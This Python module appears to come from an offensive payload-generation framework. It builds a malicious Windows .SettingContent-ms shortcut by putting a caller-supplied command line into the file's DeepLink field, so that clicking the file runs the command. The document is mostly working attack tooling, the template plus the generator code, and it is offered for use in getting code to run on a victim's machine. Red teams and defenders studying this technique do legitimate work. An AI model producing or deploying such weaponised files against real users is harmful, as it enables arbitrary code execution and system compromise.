#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.mp_generator import Generator
from collections import OrderedDict

"""

Inspired by https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
Template from: https://gist.github.com/enigma0x3/b948b81717fd6b72e0a4baca033e07f8

"""


SETTINGS_MS_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
    <ApplicationInformation>
      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
      <DeepLink><<<CMD>>></DeepLink>
      <Icon><<<ICON>>></Icon>
    </ApplicationInformation>
    <SettingIdentity>
      <PageID></PageID>
      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
    </SettingIdentity>
    <SettingInformation>
      <Description>@shell32.dll,-4161</Description>
      <Keywords>@shell32.dll,-4161</Keywords>
    </SettingInformation>
  </SearchableContent>
</PCSettings>
"""


class SettingsShortcutGenerator(Generator):
    """ Module used to generate malicious MS Settings shortcut"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(" [+] Generating %s file..." % self.outputFileType)        
        paramDict = OrderedDict([("Cmd_Line",None),("Icon_Path",None)])      
        self.fillInputParams(paramDict)
        
        # Fill template
        content = SETTINGS_MS_TEMPLATE
        content = content.replace("<<<CMD>>>", paramDict["Cmd_Line"])
        content = content.replace("<<<ICON>>>", paramDict["Icon_Path"])
             
        # Write in new SCF file
        f = open(self.outputFilePath, 'w')
        f.writelines(content)
        f.close()
        
        logging.info("   [-] Generated Settings Shortcut file: %s" % self.outputFilePath)
        logging.info("   [-] Test with : \n Click on %s file to test.\n" % self.outputFilePath)
        

        
        
        